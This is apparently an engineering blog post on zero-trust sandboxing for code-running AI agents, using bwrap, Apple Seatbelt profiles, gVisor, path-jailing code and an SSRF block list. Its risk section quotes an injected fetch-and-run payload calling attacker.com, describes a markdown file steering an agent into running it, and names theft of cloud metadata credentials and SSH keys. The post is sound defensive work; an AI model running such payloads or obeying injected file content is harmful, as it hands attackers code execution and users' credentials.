# How We Built Zero-Trust Sandboxing for AI Agents (bwrap, Seatbelt, & gVisor)

If you are building an AI agent that writes code, eventually it has to run that code. The easiest way to do this is to give the LLM a `bash` tool.

I've done this. It is incredibly dangerous.

After watching an agent hallucinate a destructive command that wiped out local configuration files, I realized that **agents cannot be trusted with raw shell access in production.**

This guide details the hard-won lessons of migrating from an open shell to a tiered, zero-trust execution sandbox using `bwrap`, Apple Seatbelt, and gVisor, complete with network and worktree isolation.

## The Inherent Danger of the Shell

When you give an LLM a shell, you are giving it the keys to the kingdom.

```bash
# Bad: Giving an agent an open shell
$ opencode run agent
agent> bash -c "rm -rf /tmp/cache && restart_server"
```

The risks are catastrophic:

1. **Hallucination Blast Radius:** An agent might try to be "helpful" by cleaning up temporary files and accidentally delete your home directory.
2. **Command Injection:** If your agent reads a user-supplied `.md` file containing `; curl -s http://attacker.com/pwn | bash`, the agent will execute it.
3. **SSRF (Server-Side Request Forgery):** A cloud-hosted agent with `curl` can hit AWS metadata endpoints (`169.254.169.254`) and exfiltrate IAM credentials.

The rule of thumb: **Treat an AI agent exactly like a remote, unauthenticated user uploading a binary to your server.**

## The Tiered Sandbox Architecture

We couldn't rely on a single isolation mechanism because agents run everywhere—from local developer laptops to multi-tenant cloud infrastructure. We built a pluggable backend system.

### 1. Linux: Bubblewrap (`bwrap`)

For Linux environments, Docker is too heavy for ephemeral, millisecond-latency agent operations. Instead, we use `bwrap` (Bubblewrap), the same unprivileged sandboxing tool used by Flatpak.

```bash
# How the agent's command is actually executed under the hood
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /bin /bin \
  --ro-bind /lib /lib \
  --bind /path/to/project /workspace \
  --unshare-all \
  --share-net \
  --die-with-parent \
  --chdir /workspace \
  /bin/bash -c "npm run test"
```

This ensures the agent can read system libraries to execute binaries, but the root filesystem is entirely Read-Only (`--ro-bind`). The only place it can write data is the specific `/workspace` we map in.

### 2. macOS: Apple Seatbelt (`sandbox-exec`)

macOS doesn't have namespaces or cgroups like Linux. Instead, we generate dynamic Apple Seatbelt (Scheme) profiles and run the agent tools via `sandbox-exec`.

```scheme
;; The generated Seatbelt profile
(version 1)
(deny default)

;; Allow basic execution
(allow process-exec (regex #"^/usr/bin/.*"))
(allow process-exec (regex #"^/bin/.*"))

;; Strict Worktree Isolation
(allow file-read* (subpath "/Users/dev/project"))
(allow file-write* (subpath "/Users/dev/project"))

;; Deny everything else
(deny file-write* (subpath "/Users/dev/.ssh"))
(deny network-outbound)
```

By default, we enforce network denial (`deny network-outbound`) at the OS level unless explicitly authorized for the task.

### 3. Cloud: gVisor (`runsc`)

For multi-tenant cloud deployments, kernel namespaces (`bwrap`) aren't enough—a kernel exploit breaks the entire node. We step up to gVisor, which intercepts all sys-calls in user space.

If the agent manages to execute a malicious binary, the sys-calls never actually hit the host Linux kernel. They are handled by gVisor's Go-based Sentry, neutralizing container escape vulnerabilities entirely.

## The Two Pillars of Agent Isolation

### Pillar 1: Agent Worktree Isolation

Agents should only operate on the files they were explicitly assigned to. However, agents frequently try to navigate "up and out" to find context.

```typescript
// Bad: The agent traverses out of the project
agent.on("read_file", async (req) => {
  const file = await fs.readFile(req.path) // Vuln: path traversal
})

// Good: Strict Jailing
import path from "node:path"

function resolveAgentPath(projectRoot: string, requestedPath: string) {
  const resolved = path.resolve(projectRoot, requestedPath)
  if (!resolved.startsWith(projectRoot)) {
    throw new Error("Sandbox Violation: Path Traversal Attempted")
  }
  return resolved
}
```

This prevents the agent from executing `read_file("../../.ssh/id_rsa")`.

### Pillar 2: HTTP Hook Network Isolation

Sometimes agents _need_ the internet to download dependencies or read documentation. But an open network is an SSRF vector.

We implemented a strict HTTP hook that intercepts all outbound requests originating from the sandbox.

```typescript
const BLOCKED_CIDRS = [
  "127.0.0.0/8", // Localhost
  "169.254.169.254", // Cloud Metadata
  "10.0.0.0/8", // Internal VPC
]

function isSafeToFetch(url: string) {
  const ip = dns.resolve(url)
  for (const cidr of BLOCKED_CIDRS) {
    if (inRange(ip, cidr)) return false // Block SSRF
  }
  return true
}
```

## The Extism WebAssembly Escape Hatch

Finally, for highly structured agent plugins (like parsing custom formats or running specific syntax checks), we removed OS-level execution entirely.

Instead, we compile plugins to WebAssembly and run them using **Extism**. The agent executes logic in a memory-safe, pure compute environment with zero file system or network access.

## Why This Matters

We are moving past the era of "chatbots" and into the era of "autonomous enterprise agents." When agents operate asynchronously across codebases, infrastructure, and CI/CD pipelines, hope is not a security strategy.

Zero-trust sandboxing isn't an optional feature for AI platforms; it is the fundamental prerequisite for deploying agents safely.
